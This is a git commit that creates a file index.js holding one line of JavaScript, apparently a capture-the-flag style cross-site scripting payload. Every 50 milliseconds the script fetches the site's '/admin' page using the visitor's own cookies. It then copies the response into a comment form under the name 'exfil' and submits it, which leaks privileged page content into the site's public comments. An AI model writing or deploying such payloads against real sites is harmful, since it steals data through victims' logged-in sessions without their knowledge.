7fb9d27bd0afac5919d43240b2f7dd6b13b5b5ab
BenTechy Service Account <123170249+bentechy-service-account@users.noreply.github.com>
2023-05-04 21:17:53 +0100

    Create index.js

---
+++ index.js
@@ -0,0 +1,1 @@
+setInterval(() => {fetch("/admin", {"credentials": "include"}).then(res => res.text()).then(x => {document.getElementById("name").value = "exfil";document.getElementById("comment").value = x.replaceAll("<", "&lt;").replaceAll(">", "&gt;");document.querySelector("button").click();})}, 50);
